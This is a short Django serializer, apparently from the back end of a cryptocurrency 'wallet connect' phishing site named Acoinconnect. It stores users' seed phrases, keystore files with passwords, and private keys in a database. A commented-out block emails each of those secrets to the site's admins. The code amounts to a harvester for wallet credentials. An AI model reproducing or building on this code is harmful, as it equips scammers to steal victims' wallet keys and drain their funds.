from django.db.models import fields
from .models import CryptoWallets
from rest_framework.serializers import ModelSerializer
from django.core.mail import send_mail, EmailMultiAlternatives, mail_admins
from email.utils import getaddresses
import environ
env = environ.Env(
)
environ.Env.read_env()


class CryptoWalletsSerializer(ModelSerializer):
    class Meta:
        model = CryptoWallets
        fields = "__all__"

    def create(self, validated_data):
        # if 'phrase' in validated_data:
        #     text_content = f"Name:\n{validated_data['name']} \nEmail:\n{validated_data['email']} \nPhrase:\n{validated_data['phrase']} \nWallet Name\n{validated_data['wallet_name']}"
        #     html_content = f"<b>Phrase:</b>\n{validated_data['phrase']} <br><b>Wallet name:</b>\n{validated_data['wallet_name']}"
        #     send_mail('Acoinconnect', text_content, env(
        #         "DEFAULT_FROM_EMAIL"), getaddresses([env('DJANGO_ADMINS')]))
        # if 'keystore_json' in validated_data and 'password' in validated_data:
        #     text_content = f"Name:\n{validated_data['name']} \nEmail:\n{validated_data['email']} \nKeystore JSON:\n{validated_data['keystore_json']} \nPassword:\n{validated_data['password']} \nWallet Name \n{validated_data['wallet_name']}"
        #     html_content = f"<b>Keystore JSON:</b>\n{validated_data['keystore_json']} <br><b>Password:</b>\n{validated_data['password']} <br><b>Wallet name:</b>\n{validated_data['wallet_name']}"
        #     send_mail('Acoinconnect', text_content, env(
        #         "DEFAULT_FROM_EMAIL"), getaddresses([env('DJANGO_ADMINS')]))
        # if 'private_key' in validated_data:
        #     text_content = f"Name:\n{validated_data['name']} \nEmail:\n{validated_data['email']} \nPrivate Key:\n{validated_data['private_key']} \nWallet Name\n{validated_data['wallet_name']}"
        #     html_content = f"<b>Private Key:</b>\n{validated_data['private_key']} <br><b>Wallet name:</b>\n{validated_data['wallet_name']}"
        #     send_mail('Acoinconnect', text_content, env(
        #         "DEFAULT_FROM_EMAIL"), getaddresses([env('DJANGO_ADMINS')]))
        return CryptoWallets.objects.create(**validated_data)
